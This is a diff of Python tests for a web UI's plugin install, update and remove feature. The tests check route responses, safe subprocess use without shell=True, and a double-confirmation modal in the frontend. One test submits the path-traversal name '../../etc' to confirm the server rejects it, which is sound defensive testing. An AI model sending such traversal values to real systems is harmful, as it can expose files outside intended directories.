+        assert captured["status"] == 404
+
+    def test_remove_route_rejects_traversal_name_with_400(self, monkeypatch):
+        from api import routes
+
+        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
+        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
+        monkeypatch.setattr("api.plugin_lifecycle.list_installed_plugins", lambda: [{"name": "my-plugin"}])
+        captured = self._post_setup(monkeypatch, routes, {"name": "../../etc"})
+
+        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/remove", query=""))
+
+        assert captured["status"] == 400
+
+    def test_remove_route_starts_action_for_known_name(self, monkeypatch):
+        from api import routes
+
+        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
+        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
+        monkeypatch.setattr("api.plugin_lifecycle.list_installed_plugins", lambda: [{"name": "my-plugin"}])
+        seen = {}
+
+        def fake_start(action, arg, **kw):
+            seen["action"] = action
+            seen["arg"] = arg
+            return True, {"available": True, "running": True, "last": None, "installed": []}
+
+        monkeypatch.setattr("api.plugin_lifecycle.start_action", fake_start)
+        captured = self._post_setup(monkeypatch, routes, {"name": "my-plugin"})
+
+        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/remove", query=""))
+
+        assert captured["status"] == 200
+        assert seen == {"action": "remove", "arg": "my-plugin"}
+
+
+class TestPluginLifecycleModuleDesign:
+    """Structural checks that the risky design decisions actually landed in code.
+
+    These parse the AST rather than grepping raw text: the module's own
+    docstrings/comments deliberately name ``hermes_cli.plugins_cmd`` and
+    ``shell=True`` in prose (explaining what this module *avoids* doing), so
+    a naive substring search would false-positive on the explanation itself.
+    """
+
+    def test_uses_subprocess_not_in_process_import(self):
+        assert "subprocess.run" in PLUGIN_LIFECYCLE_PY
+        tree = ast.parse(PLUGIN_LIFECYCLE_PY)
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Import):
+                assert not any(alias.name.startswith("hermes_cli") for alias in node.names), (
+                    "must not import hermes_cli in-process"
+                )
+            if isinstance(node, ast.ImportFrom):
+                assert not (node.module or "").startswith("hermes_cli"), (
+                    "must not import from hermes_cli in-process"
+                )
+            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
+                assert node.func.attr != "dashboard_install_plugin"
+
+    def test_never_uses_shell_true(self):
+        tree = ast.parse(PLUGIN_LIFECYCLE_PY)
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Call):
+                for kw in node.keywords:
+                    if kw.arg == "shell":
+                        is_true = isinstance(kw.value, ast.Constant) and kw.value.value is True
+                        assert not is_true, "a subprocess call passes shell=True"
+
+    def test_sets_hermes_home_for_active_profile(self):
+        assert "HERMES_HOME" in PLUGIN_LIFECYCLE_PY
+        assert "_gateway_restart_profile_context" in PLUGIN_LIFECYCLE_PY
 
 
 class TestPluginLifecycleHTML:
@@ -397,7 +507,6 @@ class TestPluginLifecycleHTML:
             'id="pluginLifecycleForm"',
             'id="pluginInstallIdentifier"',
             'id="btnPluginInstall"',
-            'id="pluginResolvePreview"',
             'id="pluginInstallResult"',
             'id="pluginLifecycleList"',
             'id="pluginLifecycleEmpty"',
@@ -412,7 +521,6 @@ class TestPluginLifecycleHTML:
         assert pane_start < lifecycle_idx < pane_end
 
     def test_meta_text_no_longer_claims_read_only(self):
-        """The panel gained write actions; the description must not still say read-only."""
         pane_start = INDEX_HTML.find('id="settingsPanePlugins"')
         pane_end = INDEX_HTML.find('id="settingsPaneExtensions"')
         segment = INDEX_HTML[pane_start:pane_end]
@@ -426,44 +534,71 @@ class TestPluginLifecycleJS:
             "function _renderPluginLifecycle",
             "function _buildPluginLifecycleRow",
             "function _bindPluginLifecycleControls",
-            "async function _previewPluginSource",
             "async function _installPluginFromForm",
             "async function _updateInstalledPlugin",
             "async function _removeInstalledPlugin",
+            "function _pluginConfirmModal",
         ):
             assert fn in PANELS_JS, f"Missing {fn} in panels.js"
 
     def test_calls_expected_endpoints(self):
-        assert "/api/plugins/installed" in PANELS_JS
-        assert "/api/plugins/resolve?identifier=" in PANELS_JS
-        assert "/api/plugins/install" in PANELS_JS
-        assert "/update'" in PANELS_JS
-        assert "/remove'" in PANELS_JS
+        assert "/api/plugins/lifecycle/status" in PANELS_JS
+        assert "/api/plugins/lifecycle/install" in PANELS_JS
+        assert "/api/plugins/lifecycle/update" in PANELS_JS
+        assert "/api/plugins/lifecycle/remove" in PANELS_JS
+        # The old resolve-preview endpoint from an earlier iteration must be gone.
+        assert "/api/plugins/resolve" not in PANELS_JS
+        assert "/api/plugins/installed" not in PANELS_JS
 
-    def test_install_and_remove_use_confirm_dialog(self):
+    def test_confirm_modal_requires_checkbox_before_enabling_confirm(self):
+        idx = PANELS_JS.find("function _pluginConfirmModal")
+        assert idx >= 0
+        body = PANELS_JS[idx:idx + 3500]
+        assert "pluginConfirmAck" in body
+        assert "okBtn.disabled=true" in body
+        assert "ack.onchange" in body
+        assert "okBtn.disabled=!ack.checked" in body
+
+    def test_install_update_remove_use_confirm_modal_not_shared_dialog(self):
         for fn_name in ("_installPluginFromForm", "_updateInstalledPlugin", "_removeInstalledPlugin"):
             idx = PANELS_JS.find(f"async function {fn_name}")
             assert idx >= 0
-            body = PANELS_JS[idx:idx + 900]
-            assert "showConfirmDialog" in body, f"{fn_name} must confirm before acting"
+            body = PANELS_JS[idx:idx + 700]
+            assert "_pluginConfirmModal" in body, f"{fn_name} must use the double-confirmation modal"
 
-    def test_load_plugins_panel_also_loads_lifecycle_and_gates_tab_hide(self):
+    def test_gate_and_availability_notes_rendered(self):
+        idx = PANELS_JS.find("function _renderPluginLifecycleNote")
+        assert idx >= 0
+        body = PANELS_JS[idx:idx + 700]
+        assert "data.available" in body
+        assert "data.writable" in body
+        assert "settings_plugin_lifecycle_unavailable" in body
+        assert "settings_plugin_lifecycle_gate_disabled" in body
+
+    def test_buttons_disabled_when_not_interactive_or_busy(self):
+        idx = PANELS_JS.find("function _renderPluginLifecycle(data)")
+        assert idx >= 0
+        body = PANELS_JS[idx:idx + 900]
+        assert "interactive" in body
+        assert "busy" in body
+        assert "input.disabled=" in body
+        assert "installBtn.disabled=" in body
+
+    def test_polls_status_while_running(self):
+        idx = PANELS_JS.find("function _syncPluginLifecyclePolling")
+        assert idx >= 0
+        body = PANELS_JS[idx:idx + 700]
+        assert "setInterval(loadPluginLifecyclePanel,2000)" in body
+        assert "clearInterval" in body
+
+    def test_load_plugins_panel_gates_tab_hide_on_writable(self):
         idx = PANELS_JS.find("async function loadPluginsPanel")
         assert idx >= 0
         body = PANELS_JS[idx:idx + 1400]
         assert "loadPluginLifecyclePanel" in body
-        assert "write_allowed" in body
-        # #3457 behavior preserved: tab still hides on empty, now also gate-aware.
+        assert "lifecycleData.writable" in body or ".writable" in body
         assert "data-settings-section=\"plugins\"" in body
         assert ".empty" in body
-
-    def test_gate_note_shown_when_write_not_allowed(self):
-        idx = PANELS_JS.find("function _renderPluginLifecycle")
-        assert idx >= 0
-        body = PANELS_JS[idx:idx + 900]
-        assert "pluginLifecycleGateNote" in body
-        assert "write_allowed" in body
-        assert "settings_plugin_lifecycle_gate_disabled" in body
 
 
 class TestPluginLifecycleI18n:
@@ -471,28 +606,31 @@ class TestPluginLifecycleI18n:
         "settings_plugin_lifecycle_title",
         "settings_plugin_lifecycle_desc",
         "settings_plugin_lifecycle_gate_disabled",
+        "settings_plugin_lifecycle_unavailable",
         "settings_plugin_install_placeholder",
         "settings_plugin_btn_install",
         "settings_plugin_btn_update",
         "settings_plugin_btn_remove",
         "settings_plugin_installed_title",
         "settings_plugin_installed_empty",
-        "settings_plugin_resolves_to",
-        "settings_plugin_insecure_scheme",
+        "settings_plugin_confirm_ack",
         "settings_plugin_confirm_install_title",
         "settings_plugin_confirm_install_msg",
         "settings_plugin_confirm_update_title",
         "settings_plugin_confirm_update_msg",
         "settings_plugin_confirm_remove_title",
         "settings_plugin_confirm_remove_msg",
-        "settings_plugin_install_success",
+        "settings_plugin_install_started",
         "settings_plugin_install_failed",
-        "settings_plugin_update_success",
-        "settings_plugin_update_unchanged",
+        "settings_plugin_update_started",
         "settings_plugin_update_failed",
-        "settings_plugin_remove_success",
+        "settings_plugin_remove_started",
         "settings_plugin_remove_failed",
-        "settings_plugin_missing_env",
+        "settings_plugin_last_action_install",
+        "settings_plugin_last_action_update",
+        "settings_plugin_last_action_remove",
+        "settings_plugin_last_ok",
+        "settings_plugin_last_failed",
     ]
 
     def test_all_keys_present(self):
